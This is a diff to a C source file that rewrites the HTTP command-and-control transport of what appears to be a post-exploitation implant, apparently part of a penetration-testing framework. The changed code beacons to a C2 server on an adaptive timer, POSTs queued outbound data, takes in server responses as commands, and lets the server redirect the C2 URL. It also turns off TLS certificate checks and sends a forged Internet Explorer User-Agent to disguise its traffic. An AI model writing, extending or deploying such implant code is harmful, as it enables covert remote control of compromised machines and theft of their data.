@@ -4,107 +4,193 @@
  * @file c2_http.c
  */
 
+#include <stdbool.h>
 #include <stdlib.h>
 
 #include "c2.h"
 #include "http_client.h"
 #include "log.h"
+#include "tlv.h"
 
 struct http_ctx {
 	struct c2_transport *t;
 	char *uri;
+	struct ev_timer poll_timer;
+	char * headers[2];
 	struct http_request_data data;
 	struct http_request_opts opts;
+	struct buffer_queue *egress;
+	int first_packet;
 	int in_flight;
 	int running;
 };
 
-int http_transport_init(struct c2_transport *t)
+static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
 {
-	struct http_ctx *http = calloc(1, sizeof *http);
-	if (http == NULL) {
-		return -1;
-	}
-
-	http->t = t;
-	http->uri = strdup(c2_transport_uri(t));
-	if (http->uri == NULL) {
-		free(http);
-		return -1;
-	}
-
-	http->data.flags = HTTP_DATA_COMPRESS;
-	http->opts.flags = HTTP_OPTS_VERBOSE | HTTP_OPTS_SKIP_TLS_VALIDATION;
-
-	c2_transport_set_ctx(t, http);
-	return 0;
-}
-
-static void http_poll_cb(struct http_conn *conn, void *arg)
-{
-	struct http_ctx *http = arg;
-
-	int code = http_conn_response_code(conn);
-	if (code > 0) {
-		c2_transport_reachable(http->t);
-	} else {
-		c2_transport_unreachable(http->t);
-	}
-
-	if (code == 200) {
-		ssize_t buflen = 0;
-		void *buf = http_conn_response_raw(conn, &buflen);
-		c2_transport_ingress_buf(http->t, buf, buflen);
-		free(buf);
-	}
-	http->in_flight = 0;
-}
-
-static void http_poll(struct http_ctx *http, struct c2_transport *t)
-{
-	if (!http->in_flight) {
-		http->in_flight = 1;
-		if (http->data.content) {
-			http_request(http->uri, http_request_post, http_poll_cb, http,
-					&http->data, &http->opts);
-		} else {
-			http_request(http->uri, http_request_get, http_poll_cb, http,
-					&http->data, &http->opts);
+	struct tlv_packet *request = tlv_packet_read_buffer_queue(q);
+	if (request) {
+		const char *method = tlv_packet_get_str(request, TLV_TYPE_METHOD);
+		const char *new_uri = tlv_packet_get_str(request, TLV_TYPE_TRANS_URL);
+		if (strcmp(method, "core_patch_url") == 0 && new_uri) {
+			char *old_uri = ctx->uri;
+			char *split = ctx->uri;
+			for (int i = 0; i < 3; i++) {
+				if (split == NULL) {
+					break;
+				}
+				split = strchr(++split, '/');
+			}
+			if (split) {
+				*split = '\0';
+			}
+			if (asprintf(&ctx->uri, "%s%s", ctx->uri, new_uri) > 0) {
+				free(old_uri);
+			}
 		}
 	}
 }
 
+static void http_poll_cb(struct http_conn *conn, void *arg)
+{
+	struct http_ctx *ctx = arg;
+
+	int code = http_conn_response_code(conn);
+
+	if (code > 0) {
+		c2_transport_reachable(ctx->t);
+	} else {
+		c2_transport_unreachable(ctx->t);
+	}
+
+	bool got_command = false;
+	if (code == 200) {
+		struct buffer_queue *q = http_conn_response_queue(conn);
+		if (ctx->first_packet) {
+			patch_uri(ctx, q);
+			ctx->first_packet = 0;
+			got_command = true;
+		} else {
+			size_t len;
+			if (buffer_queue_len(q)) {
+				got_command = true;
+				c2_transport_ingress_queue(ctx->t, q);
+			}
+		}
+	}
+
+	if (got_command) {
+		ctx->poll_timer.repeat = 0.01;
+	} else {
+		if (ctx->poll_timer.repeat < 0.1) {
+			ctx->poll_timer.repeat = 0.1;
+		} else if (ctx->poll_timer.repeat < 5.0) {
+			ctx->poll_timer.repeat += 0.1;
+		}
+	}
+
+	ctx->in_flight = 0;
+}
+
+static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
+{
+	struct http_ctx *ctx = w->data;
+	if (!ctx->in_flight) {
+		ctx->in_flight = 1;
+		if (buffer_queue_len(ctx->egress) > 0) {
+			ctx->data.content_len = buffer_queue_remove_all(ctx->egress,
+					&ctx->data.content);
+			http_request(ctx->uri, http_request_post, http_poll_cb, ctx,
+					&ctx->data, &ctx->opts);
+			ctx->data.content_len = 0;
+			ctx->data.content = NULL;
+		} else {
+			http_request(ctx->uri, http_request_get, http_poll_cb, ctx,
+					&ctx->data, &ctx->opts);
+		}
+	}
+
+	if (ctx->running) {
+		ev_timer_again(c2_transport_loop(ctx->t), &ctx->poll_timer);
+	}
+}
+
+void http_ctx_free(struct http_ctx *ctx)
+{
+	if (ctx) {
+		if (ctx->egress) {
+			buffer_queue_free(ctx->egress);
+		}
+		free(ctx->uri);
+		free(ctx);
+	}
+}
+
+int http_transport_init(struct c2_transport *t)
+{
+	struct http_ctx *ctx = calloc(1, sizeof *ctx);
+	if (ctx == NULL) {
+		return -1;
+	}
+
+	ctx->t = t;
+	ctx->uri = strdup(c2_transport_uri(t));
+	if (ctx->uri == NULL) {
+		goto err;
+	}
+
+	ctx->data.content_type = "application/octet-stream";
+	//ctx->data.flags = HTTP_DATA_COMPRESS;
+	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;
+
+	ctx->headers[0] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
+	ctx->headers[1] = "Connection: close";
+	ctx->data.headers = ctx->headers;
+	ctx->data.num_headers = 2;
+
+	ctx->first_packet = 1;
+
+	ev_init(&ctx->poll_timer, http_poll_timer_cb);
+	ctx->poll_timer.data = ctx;
+
+	ctx->egress = buffer_queue_new();
+	if (ctx->egress == NULL) {
+		goto err;
+	}
+
+	c2_transport_set_ctx(t, ctx);
+	return 0;
+
+err:
+	http_ctx_free(ctx);
+	return -1;
+}
+
 void http_transport_start(struct c2_transport *t)
 {
-	struct http_ctx *http = c2_transport_get_ctx(t);
-	http->running = 1;
-	http_poll(http, t);
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	ctx->running = 1;
+	ctx->poll_timer.repeat = 0.01;
+	ev_timer_again(c2_transport_loop(t), &ctx->poll_timer);
 }
 
 void http_transport_egress(struct c2_transport *t, struct buffer_queue *egress)
 {
-	struct http_ctx *http = c2_transport_get_ctx(t);
-	http->data.content_len = buffer_queue_remove_all(egress, &http->data.content);
-	http_poll(http, t);
-}
-
-void http_transport_poll(struct c2_transport *t)
-{
-	struct http_ctx *http = c2_transport_get_ctx(t);
-	http_poll(http, t);
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	buffer_queue_move_all(ctx->egress, egress);
 }
 
 void http_transport_stop(struct c2_transport *t)
 {
-	struct http_ctx *http = c2_transport_get_ctx(t);
-	if (http->running) {
-		http->running = 0;
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	if (ctx->running) {
+		ctx->running = 0;
 	}
 }
 
 void http_transport_free(struct c2_transport *t)
 {
-	struct http_ctx *http = c2_transport_get_ctx(t);
+	struct http_ctx *ctx = c2_transport_get_ctx(t);
+	buffer_queue_free(ctx->egress);
 }
 
 void c2_register_http_transports(struct c2 *c2)
@@ -113,7 +199,6 @@ void c2_register_http_transports(struct c2 *c2)
 		.init = http_transport_init,
 		.start = http_transport_start,
 		.egress = http_transport_egress,
-		.poll = http_transport_poll,
 		.stop = http_transport_stop,
 		.free = http_transport_free
 	};
